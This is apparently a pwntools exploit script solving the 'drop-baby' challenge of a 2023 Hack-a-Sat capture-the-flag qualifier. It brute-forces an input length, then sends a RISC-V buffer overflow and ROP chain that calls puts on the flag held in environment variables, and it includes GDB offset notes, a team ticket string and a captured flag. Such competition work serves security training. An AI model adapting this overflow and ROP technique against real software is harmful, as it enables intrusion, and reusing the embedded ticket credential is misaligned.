
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *
import sys
import os

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./drop-baby')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# ret at buffer overflow
hbreak *do_b2+0x56
command
    tbreak puts
end
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
if args['REMOTE']:
    remote_server = 'drop.quals2023-kah5Aiv9.satellitesabove.me'
    remote_port = 5300
else:
    arguments = []
    os.environ['FLAG'] = 'hackasat{dummy-flag}'
    os.environ['TIMEOUT'] = '3600'

def bruteForceIni(): # result is input length to print the ini
    mydata = b''
    while True:
        mydata += b'A'
        print(f"Attempting data len: {len(mydata)}")

        if args['REMOTE']:
            io = remote(remote_server, remote_port)
            io.recvline() # Ticket please:
            io.send(b'ticket{alpha542765whiskey4:GLnT34rPAupXSBMNiLWcgk0dLhUeF5gSSzxqnownNALObAoYzg8MHH0jle5Ttq7FXw}\n')
        else:
            io = start(arguments)
        io.recvline_endswith(b'Exploit me!')
        io.send(b'\xde\xad\xbe\xef') # sync prefix
        io.send(b'\xb1') # read_message
        io.send(mydata + p32(crc.crc_32(mydata)))
        printed_data = io.recvall(timeout=2)
        if len(printed_data) > 0:
            print(printed_data.decode('ascii'))
            sys.exit(0)
        io.close()
# bruteForceIni()

# read_message
def sendCmd(cmd: int, data: bytes):
    io.send(bytes([cmd]))
    if cmd == 0xa1:
        data_len = 36
    elif cmd == 0xa2:
        data_len = 6
    elif cmd == 0xb1:
        data_len = 16
    elif cmd == 0xb2:
        data_len = 296
    assert(len(data) <= data_len)
    if len(data) < data_len:
        data = data + b'Z'*(data_len - len(data)) # pad
    io.send(data + p32(crc.crc_32(data)))

def getDict():
    sendCmd(0xb1, b'A'*16)
    return io.recvall(timeout=2).decode('ascii')

if args['REMOTE']:
    io = remote(remote_server, remote_port)
    io.recvline() # Ticket please:
    io.send(b'ticket{alpha542765whiskey4:GLnT34rPAupXSBMNiLWcgk0dLhUeF5gSSzxqnownNALObAoYzg8MHH0jle5Ttq7FXw}\n')
    offset = 0xd2 # this is actually in the environment variables? lol. Might be a little bit unreliable.
else:
    os.environ['FLAG'] = 'hackasat{dummy-flag}'
    os.environ['TIMEOUT'] = '3600'
    io = start(arguments)
    offset = 0x21e

print(f"Using offset: {offset}")

io.recvline_endswith(b'Exploit me!')
io.send(b'\xde\xad\xbe\xef') # sync prefix: deadbeef

# For the buffer overflow:
# g = cyclic_gen()
# sendCmd(0xb2, g.get(296))
# g.find(b'eaab') # (116, 0, 116)
puts__addr = 0x0001673c

########## ROP chain idea
# puts(flag)
# Where `flag` is located in the environment variable as it has not been erased
# 
########## Useful gadgets
# 0x000170d8 : c.lwsp ra, 0x2c(sp) ; c.lwsp s0, 0x28(sp) ; c.lwsp s1, 0x24(sp) ; c.lwsp s2, 0x20(sp) ; c.lwsp s3, 0x1c(sp) ; c.addi16sp sp, 0x30 ; c.jr ra
#  set s0, s1, s2, s3, ra
#  jr ra
#
# 0x00030c12 : c.mv a1, s2 ; c.mv a0, s3 ; c.mv a2, s1 ; c.jalr s0
#  a0=s3
#  a1=s2
#  a2=s1
#  jalr s0
#
# 0x0004b852 : c.add a0, s0 ; c.jalr s3
#  a0 = a0 + s0
#  jalr s3
#
########## gef
# gef➤  p $pc
# $1 = (void (*)()) 0x10faa <do_b2+86>
# gef➤  x/1i $pc
# => 0x10faa <do_b2+86>:  ret
# 
# gef➤  info registers
# sp             0x407ffad0       0x407ffad0
# a1             0x407ffa58       0x407ffa58
# s3             0x407ffc44       0x407ffc44
# s4             0x407ffc4c       0x407ffc4c
# gef➤  p $sp
# $2 = (void *) 0x407ffad0
# gef➤  find $sp, +0x1000, {char[8]}"hackasat{"
# 0x407ffe62
# 1 pattern found.
#
# gef➤  p 0x407ffe62-$s3
# $1 = 0x21e
# So our offset is 0x21e

# a1, s3, s4 hold stack addresses. We can find the flag at a fixed offset which will result in the environment variables
# s3+offset leads us to the flag
ropchain  = b'A'*112 # padding
ropchain += p32(0x000170d8) # overwrite the s0/fp
ropchain += p32(0x00030c12) # overwrite the ra

# 0x00030c12 : c.mv a1, s2 ; c.mv a0, s3 ; c.mv a2, s1 ; c.jalr s0
ropchain += b''
#  a1=s2
#  a0=s3
#  a2=s1
#  c.jalr s0

# 0x000170d8 : c.lwsp ra, 0x2c(sp) ; c.lwsp s0, 0x28(sp) ; c.lwsp s1, 0x24(sp) ; c.lwsp s2, 0x20(sp) ; c.lwsp s3, 0x1c(sp) ; c.addi16sp sp, 0x30 ; c.jr ra
ropchain += b''
ropchain += b'B'*0x1c       # padding
ropchain += p32(puts__addr) # s3
ropchain += b'D'*4          # s2
ropchain += b'E'*4          # s1
ropchain += p32(offset)     # s0
ropchain += p32(0x0004b852) # ra
  # jr ra

# 0x0004b852 : c.add a0, s0 ; c.jalr s3
ropchain += b''
  # a0+=s0
  # c.jalr s3

sendCmd(0xb2, ropchain) # trigger buffer overflow
# print(io.recvall(timeout=2))
# print(recved_data) # 

io.interactive()
io.close()

# flag{alpha542765whiskey4:GPqdDffrVbrK2ekLBBHPPxTAaVlGiyUaeB9ijBy4P9tHCyW_yprbd-CFQNnPe68Rl3Hp5rQCn2KErFL1AJY9CWk}
